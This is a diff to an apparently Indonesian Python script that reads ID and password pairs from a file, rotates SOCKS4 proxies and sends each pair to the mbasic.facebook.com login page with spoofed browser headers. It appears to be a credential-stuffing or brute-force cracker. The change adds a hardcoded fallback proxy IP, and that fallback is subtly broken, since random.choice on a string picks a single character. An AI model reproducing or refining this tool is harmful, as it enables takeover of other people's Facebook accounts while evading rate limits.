@@ -93,10 +93,11 @@ def babaz(pm,data):
 	lopi,slh,cp,tp = 0,0,0,0
 	for user in data:
 		try:
-			prox = open('.prox.txt','r').read().splitlines()
-			proxy = {'http': 'socks4://'+random.choice(prox)}
+			try:prox = open('.prox.txt','r').read().splitlines()
+			except: prox = '103.95.41.231:8080'
 			try:idf,pw = user.split(f"{pm}")
-			except:print(f"{k}pemisah file salah {user}\33[m");exit()			
+			except:print(f"{k}pemisah file salah {user}\33[m");exit()
+			proxy = {'http': 'socks4://'+random.choice(prox)}	
 			h2 = {'host':'mbasic.facebook.com','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control':'max-age=0','origin':'https://www.facebook.com','referer':'https://www.facebook.com','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','upgrade-insecure-requests':'1','user-agent':ua}
 			res = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',headers = h2,).text
 			ress = sop(res, 'html.parser')
